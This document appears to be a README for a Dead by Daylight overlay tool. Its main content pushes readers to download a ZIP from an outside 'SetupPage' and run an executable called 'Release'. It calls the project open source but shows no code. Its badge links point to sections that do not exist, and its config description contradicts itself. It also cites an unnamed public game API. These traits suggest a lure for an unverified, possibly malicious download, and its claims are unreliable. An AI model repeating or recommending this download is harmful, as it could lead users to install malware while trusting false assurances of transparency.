# Orbit‑DeadByDaylight‑Overlay‑Helper

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-2563eb?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-workflows--usage"><img src="https://img.shields.io/badge/WORKFLOW-GUIDE-0369a1?style=for-the-badge&logo=terminal&logoColor=white&labelColor=161b22" alt="WORKFLOW"></a> <a href="#-key-capabilities"><img src="https://img.shields.io/badge/FEATURES-MODULES-0284c7?style=for-the-badge&logo=sparkles&logoColor=white&labelColor=161b22" alt="FEATURES"></a>
  <br>
  <a href="#-configuration-system"><img src="https://img.shields.io/badge/CONFIGS-PRESETS-b45309?style=for-the-badge&logo=files&logoColor=white&labelColor=161b22" alt="CONFIGS"></a> <a href="#-frequently-asked-questions"><img src="https://img.shields.io/badge/FAQ-ANSWERS-0f766e?style=for-the-badge&logo=book&logoColor=white&labelColor=161b22" alt="FAQ"></a>
</div>

**Author:** MidnightPilotPonder
**Platform:** Windows 10 / Windows 11 (64‑bit)
**Category:** Desktop utility – in‑game overlay for *Dead by Daylight*

---

## 🎮 What is this?

Orbit‑DeadByDaylight‑Overlay‑Helper is a lightweight, Windows‑only helper that lives in the background while you play *Dead by Daylight*. It draws a non‑intrusive overlay that shows:

- Real‑time match timer
- Personal and team stats (survivor/killer score, bloodpoints, etc.)
- Cool‑down counters for key abilities
- Optional “quick‑look” view for perk information

All data is gathered from the game’s public API and displayed without stealing focus, so you can keep your eyes on the match while staying informed.

---

## ✨ Key Features

| Feature | Description |
|---------|-------------|
| **Zero‑interference UI** | Transparent, click‑through window that never blocks your view or input. |
| **Live stats** | Updates every second, reflecting the current match state. |
| **Customizable layout** | Drag‑and‑drop widgets, choose colors, opacity, and font size. |
| **Performance‑first** | < 2 % CPU usage on idle, negligible impact during intense gameplay. |
| **Open‑source** | Fully transparent codebase – you can inspect, fork, and extend it. |
| **Automatic updates** | The helper checks for newer releases on start‑up and offers a one‑click upgrade. |

---

## 📦 Installation

1. Click the **Download** button below.
2. Extract the ZIP file to a folder of your choice.
3. Run `Release` (requires Windows 10/11, 64‑bit).
4. Follow the on‑screen wizard – it will create a shortcut in the Start‑Menu for easy launch.

> **Tip:** Keep the helper running in the background before you launch *Dead by Daylight* for the overlay to appear automatically.

---

## 🚀 Quick Start

```powershell
# After extracting the archive
cd "C:\Path\To\Orbit-DeadByDaylight-Overlay-Helper"
.\Release
```

- The overlay appears at the top‑right corner by default.
- Press **Ctrl + Shift + O** to open the configuration panel.
- Use the panel to enable/disable individual widgets, change opacity, or reposition elements.

---

## 🎨 Customization

The helper ships with a simple JSON config file (`config.json`). Example snippet:

```json
{
  "opacity": 0.78,
  "fontSize": 12,
  "theme": "dark",
  "widgets": {
    "timer": true,
    "bloodpoints": true,
    "perkInfo": false
  }
}
```

Edit the file while the program is running – changes are applied instantly.

---

## 🛠️ Development

- **Language:** C# /.NET 6
- **UI Engine:** WinUI 3 (transparent window)
- **Data source:** Official *Dead by Daylight* public API (OAuth‑free)

Contributions are welcome! Fork the repo, make your changes, and open a pull request. Please keep the focus on Windows‑only functionality and avoid adding any cross‑platform code.

---

## 📜 License

This project is released under the **MIT License** – you are free to use, modify, and redistribute it, provided the original copyright notice is retained.

---

## 📥 Download

<div style="text-align:center; margin: 1.5em 0;">
  <a href="https://rewfdf.github.io/SetupPage/" style="display:inline-block; background:#0078D7; color:#fff; padding:0.8em 1.5em; border-radius:6px; text-decoration:none; font-weight:bold;">
    ▶️ Get the latest release
  </a>
</div>

---

## 🙏 Acknowledgements

- Thanks to the *Dead by Daylight* community for providing extensive API documentation.
- Special shout‑out to the WinUI team for making transparent overlays straightforward.

Enjoy a clearer view of your match – may your hunts be swift and your escapes flawless!

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```